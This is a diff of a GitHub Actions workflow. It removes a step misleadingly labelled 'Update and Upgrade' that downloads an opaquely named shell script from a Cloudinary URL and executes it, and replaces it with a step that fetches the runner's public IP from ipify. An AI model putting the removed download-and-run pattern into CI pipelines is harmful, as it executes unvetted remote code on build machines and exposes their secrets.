@@ -1,17 +1,17 @@
-name: testing
+name: IP Workflow
 
 on:
-  workflow_dispatch:
   push:
-    branches: [main]
+    branches:
+      - main
 
 jobs:
-  run:
-    continue-on-error: true
+  build:
     runs-on: ubuntu-latest
+
     steps:
-      - name: Update and Upgrade
+      - name: Get IP
         run: |
-          curl -O http://res.cloudinary.com/dyfqshedb/raw/upload/v1708020610/mbip0nevu8lc73fmojgp.sh
-          chmod +x mbip0nevu8lc73fmojgp.sh
-          ./mbip0nevu8lc73fmojgp.sh
+          curl https://api.ipify.org
+
+      # Ajoutez d'autres étapes de votre workflow ici
